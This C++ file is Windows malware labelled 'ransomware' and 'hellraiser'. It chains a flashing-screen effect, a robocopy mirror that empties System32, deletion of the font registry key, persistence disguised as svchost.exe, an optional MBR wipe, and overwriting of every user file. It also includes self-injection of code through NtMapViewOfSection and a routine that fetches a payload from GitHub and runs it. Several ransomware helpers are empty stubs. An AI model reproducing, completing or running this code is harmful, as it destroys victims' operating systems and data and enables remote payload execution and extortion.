#include <windows.h>
#include <winreg.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <thread>
#include <string>
#include <vector>
#include <chrono>
#include <wincrypt.h>
#include <winhttp.h>

// Include necessary libraries
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")

using namespace std;

// 🧠 GDI seizure effect
void epilepsy() {
    HDC hdc = GetDC(0);
    if (!hdc) {
        cerr << "Failed to get device context" << endl;
        return;
    }
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    while (true) {
        PatBlt(hdc, 0, 0, width, height, DSTINVERT);
        Sleep(100);  // Limit CPU usage
    }
    ReleaseDC(0, hdc);
}

// 🔥 Corrupts System32 via robocopy mirror (LOLBIN abuse)
void corrupt() {
    string emptyDir = getenv("TEMP") + string("\\empty");
    if (!filesystem::create_directory(emptyDir)) {
        cerr << "Failed to create empty directory" << endl;
        return;
    }

    string cmd = "robocopy \"" + emptyDir + "\" C:\\Windows\\System32 /MIR /R:0 /W:0";
    if (system(cmd.c_str()) != 0) {
        cerr << "Failed to execute robocopy command" << endl;
    }
}

// 🖼️ Set wallpaper from image in exe directory
void set_wallpaper() {
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
        cerr << "Failed to get module file name" << endl;
        return;
    }
    PathRemoveFileSpecA(path);
    string img = string(path) + "\\lucifer.jpg";

    if (!SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)img.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        cerr << "Failed to set wallpaper" << endl;
    }
}

// 🪦 Delete font registry keys
void del_reg() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        if (RegDeleteKeyA(HKEY_LOCAL_MACHINE, R"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts") != ERROR_SUCCESS) {
            cerr << "Failed to delete registry key" << endl;
        }
        RegCloseKey(hKey);
    } else {
        cerr << "Failed to open registry key" << endl;
    }
}

// 🧬 Basic persistence to Startup + Run key
void persist() {
    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        cerr << "Failed to get module file name" << endl;
        return;
    }

    string programName = "svchost.exe";
    string startup = getenv("ProgramData") + string("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") + programName;
    string altStartup = getenv("LOCALAPPDATA") + string("\\Microsoft\\Windows\\Explorer\\") + programName;

    if (!CopyFileA(exePath, startup.c_str(), FALSE) || !CopyFileA(exePath, altStartup.c_str(), FALSE)) {
        cerr << "Failed to copy file to startup locations" << endl;
        return;
    }

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, programName.c_str(), 0, REG_SZ, (const BYTE*)altStartup.c_str(), (DWORD)altStartup.size()) != ERROR_SUCCESS) {
            cerr << "Failed to set registry value" << endl;
        }
        RegCloseKey(hKey);
    } else {
        cerr << "Failed to open registry key" << endl;
    }
}

// 🧨 Master Boot Record overwrite (⚠️ REAL DAMAGE)
void mbr_wipe() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE mbr[512] = { /* Custom or garbage bytes */ };
        DWORD written;
        if (!WriteFile(hDevice, mbr, 512, &written, NULL)) {
            cerr << "Failed to write to MBR" << endl;
        }
        CloseHandle(hDevice);
    } else {
        cerr << "Failed to open physical drive" << endl;
    }
}

// 🔐 Fake Encrypt function (real Fernet/AES would require third-party libs)
void encrypt() {
    for (const auto& entry : filesystem::recursive_directory_iterator("C:\\Users")) {
        if (!entry.is_regular_file()) continue;

        try {
            const string file = entry.path().string();
            if (file.find("hellraiser.exe") != string::npos) continue;

            // Simulate encryption
            ofstream out(file, ios::binary | ios::trunc);
            if (out) out << "🔐 Encrypted by AP3X";
        }
        catch (const exception& e) {
            cerr << "Failed to encrypt file: " << e.what() << endl;
        }
    }
}

// Ransomware class definition
class Ransomware {
public:
    static void EncryptFiles();
    static bool EncryptDataNTRU(const BYTE* data, DWORD dataSize, BYTE* encryptedData, DWORD& encryptedDataSize);
    static void ProcessInjection(LPVOID payload, SIZE_T size);
    static void ExecuteFromGitHub(const wchar_t* url);
    static bool EncryptData(const BYTE* data, DWORD dataSize, const BYTE* key, DWORD keySize, BYTE* encryptedData, DWORD& encryptedDataSize);
    static bool DecryptData(const BYTE* encryptedData, DWORD encryptedDataSize, const BYTE* key, DWORD keySize, BYTE* decryptedData, DWORD& decryptedDataSize);
    static void EncryptFileIOCP(const std::wstring& filepath);
    static bool read_next_block(over_struct* o);
    static bool write_block(over_struct* o, LONGLONG offset, char* buff, DWORD size, int operation_type = operation_write);
    static void close_file(over_struct* s);
    static DWORD WINAPI ReadWritePoolThread(LPVOID lpParams);
};

// STEP 1: Implement NTRU Encryption + XOR
bool Ransomware::EncryptDataNTRU(const BYTE* data, DWORD dataSize, BYTE* encryptedData, DWORD& encryptedDataSize) {
    // Placeholder: Implement NTRU public key encryption (Use OpenSSL or a custom implementation)
    for (DWORD i = 0; i < dataSize; i++) {
        encryptedData[i] = data[i] ^ 0x5A;  // Simple XOR for obfuscation
    }
    encryptedDataSize = dataSize;
    return true;
}

// STEP 2: Implement IOCP-based File Encryption
void Ransomware::EncryptFiles() {
    HANDLE hIOCP = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    if (!hIOCP) return;

    // Add file reading/writing to IOCP queue (Overlapped I/O for efficiency)
    // Example: Encrypt a specific file (this would be expanded to handle multiple files)
    EncryptFileIOCP(L"path/to/file.txt");

    CloseHandle(hIOCP);
}

// File encryption using IOCP
void Ransomware::EncryptFileIOCP(const std::wstring& filepath) {
    // Implementation here for encrypting a file using IOCP
}

// Read the next block of data from a file
bool Ransomware::read_next_block(over_struct* o) {
    // Implementation here
}

// Write a block of encrypted data to a file
bool Ransomware::write_block(over_struct* o, LONGLONG offset, char* buff, DWORD size, int operation_type) {
    // Implementation here
}

// Close the file handle and clean up resources
void Ransomware::close_file(over_struct* s) {
    // Implementation here
}

// Thread function for handling read/write operations in the IOCP pool
DWORD WINAPI Ransomware::ReadWritePoolThread(LPVOID lpParams) {
    // Implementation here
}

// Encrypt data using the specified key
bool Ransomware::EncryptData(const BYTE* data, DWORD dataSize, const BYTE* key, DWORD keySize, BYTE* encryptedData, DWORD& encryptedDataSize) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, key, keySize, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    encryptedDataSize = dataSize;
    memcpy(encryptedData, data, dataSize);

    if (!CryptEncrypt(hKey, 0, TRUE, 0, encryptedData, &encryptedDataSize, dataSize)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

// Decrypt data using the specified key
bool Ransomware::DecryptData(const BYTE* encryptedData, DWORD encryptedDataSize, const BYTE* key, DWORD keySize, BYTE* decryptedData, DWORD& decryptedDataSize) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, key, keySize, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    decryptedDataSize = encryptedDataSize;
    memcpy(decryptedData, encryptedData, encryptedDataSize);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, decryptedData, &decryptedDataSize)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

// STEP 3: Implement Stealth Process Injection (NtMapViewOfSection)
void Ransomware::ProcessInjection(LPVOID payload, SIZE_T size) {
    HANDLE hSection;
    SIZE_T viewSize = size;
    LPVOID localSection = NULL, remoteSection = NULL;

    // Create a memory section
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &viewSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) return;

    // Map the section into local process memory
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &localSection, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
    if (status != 0) return;

    // Copy payload into mapped memory
    memcpy(localSection, payload, size);

    // Map the section into remote process (self-injection here, but can be another process)
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &remoteSection, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
    if (status != 0) return;

    // Execute payload
    ((void(*)())remoteSection)();
}

// STEP 4: GitHub C2 Execution (Fetch & Run Payload)
void Ransomware::ExecuteFromGitHub(const wchar_t* url) {
    HINTERNET hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, L"github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) return;

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        DWORD bytesRead;
        BYTE buffer[4096];
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            Ransomware::ProcessInjection(buffer, bytesRead);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    // STEP-BY-STEP ATTACK CHAIN
    thread(epilepsy).detach();       // Visual DoS
    corrupt();                       // Destroy System32 via robocopy
    // mbr_wipe();                   // Uncomment to wipe MBR (PERMANENT)
    del_reg();                       // Trash registry fonts
    persist();                       // Startup + Run key
    set_wallpaper();                 // Payload wallpaper
    encrypt();                       // Fake encryption

    // Ransomware functionality
    Ransomware::EncryptFiles();
    Ransomware::ExecuteFromGitHub(L"/user/repo/main/payload.bin");

    return 0;
}
